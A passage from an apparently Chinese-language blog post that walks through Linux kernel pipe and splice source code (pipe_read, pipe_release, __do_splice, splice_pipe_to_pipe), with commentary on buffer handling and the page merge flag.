class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">pipe_read</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *to)</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">size_t</span> total_len = iov_iter_count(to);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line">	<span class="type">bool</span> was_full, wake_next_reader = <span class="literal">false</span>;</span><br><span class="line">	<span class="type">ssize_t</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Null read succeeds. */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(total_len == <span class="number">0</span>))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	ret = <span class="number">0</span>;</span><br><span class="line">	__pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We only wake up writers if the pipe was full when we started</span></span><br><span class="line"><span class="comment">	 * reading in order to avoid unnecessary wakeups.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * But when we do wake up writers, we do so using a sync wakeup</span></span><br><span class="line"><span class="comment">	 * (WF_SYNC), because we want them to get going and generate more</span></span><br><span class="line"><span class="comment">	 * data for us.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	was_full = pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);</span><br><span class="line">	<span class="keyword">for</span> (;;) {</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> head = pipe-&gt;head;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> tail = pipe-&gt;tail;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">		<span class="keyword">if</span> (pipe-&gt;note_loss) {</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">watch_notification</span> <span class="title">n</span>;</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (total_len &lt; <span class="number">8</span>) {</span><br><span class="line">				<span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">					ret = -ENOBUFS;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			}</span><br><span class="line"></span><br><span class="line">			n.type = WATCH_TYPE_META;</span><br><span class="line">			n.subtype = WATCH_META_LOSS_NOTIFICATION;</span><br><span class="line">			n.info = watch_sizeof(n);</span><br><span class="line">			<span class="keyword">if</span> (copy_to_iter(&amp;n, <span class="keyword">sizeof</span>(n), to) != <span class="keyword">sizeof</span>(n)) {</span><br><span class="line">				<span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">					ret = -EFAULT;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			}</span><br><span class="line">			ret += <span class="keyword">sizeof</span>(n);</span><br><span class="line">			total_len -= <span class="keyword">sizeof</span>(n);</span><br><span class="line">			pipe-&gt;note_loss = <span class="literal">false</span>;</span><br><span class="line">		}</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!pipe_empty(head, tail)) {</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[tail &amp; mask];</span><br><span class="line">			<span class="type">size_t</span> chars = buf-&gt;len;</span><br><span class="line">			<span class="type">size_t</span> written;</span><br><span class="line">			<span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (chars &gt; total_len) {</span><br><span class="line">				<span class="keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_WHOLE) {</span><br><span class="line">					<span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">						ret = -ENOBUFS;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				}</span><br><span class="line">				chars = total_len;</span><br><span class="line">			}</span><br><span class="line"></span><br><span class="line">			error = pipe_buf_confirm(pipe, buf);</span><br><span class="line">			<span class="keyword">if</span> (error) {</span><br><span class="line">				<span class="keyword">if</span> (!ret)</span><br><span class="line">					ret = error;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			}</span><br><span class="line"></span><br><span class="line">			written = copy_page_to_iter(buf-&gt;page, buf-&gt;offset, chars, to);</span><br><span class="line">			<span class="keyword">if</span> (unlikely(written &lt; chars)) {</span><br><span class="line">				<span class="keyword">if</span> (!ret)</span><br><span class="line">					ret = -EFAULT;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			}</span><br><span class="line">			ret += chars;</span><br><span class="line">			buf-&gt;offset += chars;</span><br><span class="line">			buf-&gt;len -= chars;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* Was it a packet buffer? Clean up and exit */</span></span><br><span class="line">			<span class="keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_PACKET) {</span><br><span class="line">				total_len = chars;</span><br><span class="line">				buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">			}</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!buf-&gt;len) {</span><br><span class="line">				pipe_buf_release(pipe, buf);</span><br><span class="line">				spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">				<span class="keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_LOSS)</span><br><span class="line">					pipe-&gt;note_loss = <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">				tail++;</span><br><span class="line">				pipe-&gt;tail = tail;</span><br><span class="line">				spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">			}</span><br><span class="line">			total_len -= chars;</span><br><span class="line">			<span class="keyword">if</span> (!total_len)</span><br><span class="line">				<span class="keyword">break</span>;	<span class="comment">/* common path: read succeeded */</span></span><br><span class="line">			<span class="keyword">if</span> (!pipe_empty(head, tail))	<span class="comment">/* More to do? */</span></span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">		}</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!pipe-&gt;writers)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (ret)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) {</span><br><span class="line">			ret = -EAGAIN;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		}</span><br><span class="line">		__pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * We only get here if we didn't actually read anything.</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * However, we could have seen (and removed) a zero-sized</span></span><br><span class="line"><span class="comment">		 * pipe buffer, and might have made space in the buffers</span></span><br><span class="line"><span class="comment">		 * that way.</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * You can't make zero-sized pipe buffers by doing an empty</span></span><br><span class="line"><span class="comment">		 * write (not even in packet mode), but they can happen if</span></span><br><span class="line"><span class="comment">		 * the writer gets an EFAULT when trying to fill a buffer</span></span><br><span class="line"><span class="comment">		 * that already got allocated and inserted in the buffer</span></span><br><span class="line"><span class="comment">		 * array.</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * So we still need to wake up any pending writers in the</span></span><br><span class="line"><span class="comment">		 * _very_ unlikely case that the pipe was full, but we got</span></span><br><span class="line"><span class="comment">		 * no data.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (unlikely(was_full)) {</span><br><span class="line">			wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);</span><br><span class="line">			kill_fasync(&amp;pipe-&gt;fasync_writers, SIGIO, POLL_OUT);</span><br><span class="line">		}</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * But because we didn't read anything, at this point we can</span></span><br><span class="line"><span class="comment">		 * just return directly with -ERESTARTSYS if we're interrupted,</span></span><br><span class="line"><span class="comment">		 * since we've done any required wakeups and there's no need</span></span><br><span class="line"><span class="comment">		 * to mark anything accessed. And we've dropped the lock.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (wait_event_interruptible_exclusive(pipe-&gt;rd_wait, pipe_readable(pipe)) &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> -ERESTARTSYS;</span><br><span class="line"></span><br><span class="line">		__pipe_lock(pipe);</span><br><span class="line">		was_full = pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);</span><br><span class="line">		wake_next_reader = <span class="literal">true</span>;</span><br><span class="line">	}</span><br></pre></td></tr></tbody></table></figure>


<h2 id="pipe-release"><a href="#pipe-release" class="headerlink" title="pipe_release"></a>pipe_release</h2><p>close掉pipe的两端即可释放.</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pipe_release</span><br><span class="line">-&gt;put_pipe_info</span><br><span class="line"> -&gt;free_pipe_info</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">pipe_release</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> file-&gt;private_data;</span><br><span class="line"></span><br><span class="line">	__pipe_lock(pipe);</span><br><span class="line">	<span class="keyword">if</span> (file-&gt;f_mode &amp; FMODE_READ)</span><br><span class="line">		pipe-&gt;readers--;</span><br><span class="line">	<span class="keyword">if</span> (file-&gt;f_mode &amp; FMODE_WRITE)</span><br><span class="line">		pipe-&gt;writers--;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Was that the last reader or writer, but not the other side? */</span></span><br><span class="line">	<span class="keyword">if</span> (!pipe-&gt;readers != !pipe-&gt;writers) {</span><br><span class="line">		wake_up_interruptible_all(&amp;pipe-&gt;rd_wait);</span><br><span class="line">		wake_up_interruptible_all(&amp;pipe-&gt;wr_wait);</span><br><span class="line">		kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);</span><br><span class="line">		kill_fasync(&amp;pipe-&gt;fasync_writers, SIGIO, POLL_OUT);</span><br><span class="line">	}</span><br><span class="line">	__pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line">	put_pipe_info(inode, pipe);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">put_pipe_info</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> pipe_inode_info *pipe)</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">int</span> kill = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	spin_lock(&amp;inode-&gt;i_lock);</span><br><span class="line">	<span class="keyword">if</span> (!--pipe-&gt;files) {</span><br><span class="line">		inode-&gt;i_pipe = <span class="literal">NULL</span>;</span><br><span class="line">		kill = <span class="number">1</span>;</span><br><span class="line">	}</span><br><span class="line">	spin_unlock(&amp;inode-&gt;i_lock);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (kill)</span><br><span class="line">		free_pipe_info(pipe);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">free_pipe_info</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe)</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="keyword">if</span> (pipe-&gt;watch_queue) {</span><br><span class="line">		watch_queue_clear(pipe-&gt;watch_queue);</span><br><span class="line">		put_watch_queue(pipe-&gt;watch_queue);</span><br><span class="line">	}</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	(<span class="type">void</span>) account_pipe_buffers(pipe-&gt;user, pipe-&gt;nr_accounted, <span class="number">0</span>);</span><br><span class="line">	free_uid(pipe-&gt;user);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pipe-&gt;ring_size; i++) {</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> pipe-&gt;bufs + i;</span><br><span class="line">		<span class="keyword">if</span> (buf-&gt;ops)</span><br><span class="line">			pipe_buf_release(pipe, buf);</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">if</span> (pipe-&gt;tmp_page)</span><br><span class="line">		__free_page(pipe-&gt;tmp_page);</span><br><span class="line">	kfree(pipe-&gt;bufs);</span><br><span class="line">	kfree(pipe);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<h2 id="splice"><a href="#splice" class="headerlink" title="splice"></a>splice</h2><p>splice直接完成管道与文件之间的数据传输,避免内核与用户之间的数据拷贝.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE6(splice, <span class="type">int</span>, fd_in, <span class="type">loff_t</span> __user *, off_in,</span><br><span class="line">		<span class="type">int</span>, fd_out, <span class="type">loff_t</span> __user *, off_out,</span><br><span class="line">		<span class="type">size_t</span>, len, <span class="type">unsigned</span> <span class="type">int</span>, flags)</span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">in</span>, <span class="title">out</span>;</span></span><br><span class="line">	<span class="type">long</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!len))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(flags &amp; ~SPLICE_F_ALL))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	error = -EBADF;</span><br><span class="line">	in = fdget(fd_in);</span><br><span class="line">	<span class="keyword">if</span> (in.file) {</span><br><span class="line">		out = fdget(fd_out);</span><br><span class="line">		<span class="keyword">if</span> (out.file) {</span><br><span class="line">			error = __do_splice(in.file, off_in, out.file, off_out,</span><br><span class="line">						len, flags);</span><br><span class="line">			fdput(out);</span><br><span class="line">		}</span><br><span class="line">		fdput(in);</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>__do_splice获取并校验用户参数,管道一端不能设置偏移.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> __do_splice(<span class="keyword">struct</span> file *in, <span class="type">loff_t</span> __user *off_in,</span><br><span class="line">			<span class="keyword">struct</span> file *out, <span class="type">loff_t</span> __user *off_out,</span><br><span class="line">			<span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags)</span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">ipipe</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">opipe</span>;</span></span><br><span class="line">	<span class="type">loff_t</span> offset, *__off_in = <span class="literal">NULL</span>, *__off_out = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">	ipipe = get_pipe_info(in, <span class="literal">true</span>);</span><br><span class="line">	opipe = get_pipe_info(out, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ipipe &amp;&amp; off_in)</span><br><span class="line">		<span class="keyword">return</span> -ESPIPE;</span><br><span class="line">	<span class="keyword">if</span> (opipe &amp;&amp; off_out)</span><br><span class="line">		<span class="keyword">return</span> -ESPIPE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (off_out) {</span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(&amp;offset, off_out, <span class="keyword">sizeof</span>(<span class="type">loff_t</span>)))</span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line">		__off_out = &amp;offset;</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">if</span> (off_in) {</span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(&amp;offset, off_in, <span class="keyword">sizeof</span>(<span class="type">loff_t</span>)))</span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line">		__off_in = &amp;offset;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	ret = do_splice(in, __off_in, out, __off_out, len, flags);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (__off_out &amp;&amp; copy_to_user(off_out, __off_out, <span class="keyword">sizeof</span>(<span class="type">loff_t</span>)))</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	<span class="keyword">if</span> (__off_in &amp;&amp; copy_to_user(off_in, __off_in, <span class="keyword">sizeof</span>(<span class="type">loff_t</span>)))</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>do_splice函数根据两端文件的性质进行dispatch.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Determine where to splice to/from.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">do_splice</span><span class="params">(<span class="keyword">struct</span> file *in, <span class="type">loff_t</span> *off_in, <span class="keyword">struct</span> file *out,</span></span><br><span class="line"><span class="params">	       <span class="type">loff_t</span> *off_out, <span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags)</span>;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">do_splice</span><br><span class="line">  -&gt;splice_pipe_to_pipe  pipe-&gt;pipe</span><br><span class="line">  -&gt;do_splice_from       pipe-&gt;file</span><br><span class="line">  -&gt;do_splice_to         file-&gt;pipe</span><br></pre></td></tr></tbody></table></figure>

<p>splice_pipe_to_pipe函数<br>直接看主循环逻辑.分两种情况</p>
<ul>
<li>还需要拷贝的长度大于当前ibuf的长度,则直接将该ibuf给obuf,并将ibuf-&gt;op置NULL,类似于移动语义. 这里没有将ibuf-&gt;page置空,直觉上会有问题,但会看一下pipe_write,只会用pipe-&gt;page替换buf-&gt;page后再进行拷贝,所以不会影响到obuf.除非是进行Merge,假设要merge到该ibuf,则该ibuf应该是head-1,又由于i_tail++的操作,此时tail应该是(head-1)+1 ==head.则pipe此时必定是空的,也就不会进行merge操作,排除merge到该buf的可能(说的可能不是很好理解,后面还有一次分析).</li>
<li>还需要拷贝的长度小于当前ibuf的长度,先调用pipe_buf_get将ibuf-&gt;page引用+1,该页面同时被ibuf和obuf使用.但两者的len,off,flags不同.注意这里需要清除PIPE_BUF_FLAG_CAN_MERGE标志,因为该页在ibuf中还存在可读数据,在outbuf中合并写入会覆盖掉原数据.<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">splice_pipe_to_pipe</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *ipipe,</span></span><br><span class="line"><span class="params">			       <span class="keyword">struct</span> pipe_inode_info *opipe,</span></span><br><span class="line"><span class="params">			       <span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line"><span class="keyword">do</span> {</span><br><span class="line">......</span><br><span class="line">		ibuf = &amp;ipipe-&gt;bufs[i_tail &amp; i_mask];</span><br><span class="line">		obuf = &amp;opipe-&gt;bufs[o_head &amp; o_mask];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (len &gt;= ibuf-&gt;len) {</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Simply move the whole buffer from ipipe to opipe</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			*obuf = *ibuf;</span><br><span class="line">			ibuf-&gt;ops = <span class="literal">NULL</span>;</span><br><span class="line">			i_tail++;</span><br><span class="line">			ipipe-&gt;tail = i_tail;</span><br><span class="line">			input_wakeup = <span class="literal">true</span>;</span><br><span class="line">			o_len = obuf-&gt;len;</span><br><span class="line">			o_head++;</span><br><span class="line">			opipe-&gt;head = o_head;</span><br><span class="line">		} <span class="keyword">else</span> {</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Get a reference to this pipe buffer,</span></span><br><span class="line"><span class="comment">			 * so we can copy the contents over.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (!pipe_buf_get(ipipe, ibuf)) {</span><br><span class="line">				<span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">					ret = -EFAULT;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			}</span><br><span class="line">			*obuf = *ibuf;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Don't inherit the gift and merge flags, we need to</span></span><br><span class="line"><span class="comment">			 * prevent multiple steals of this page.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			obuf-&gt;flags &amp;= ~PIPE_BUF_FLAG_GIFT;</span><br><span class="line">			obuf-&gt;flags 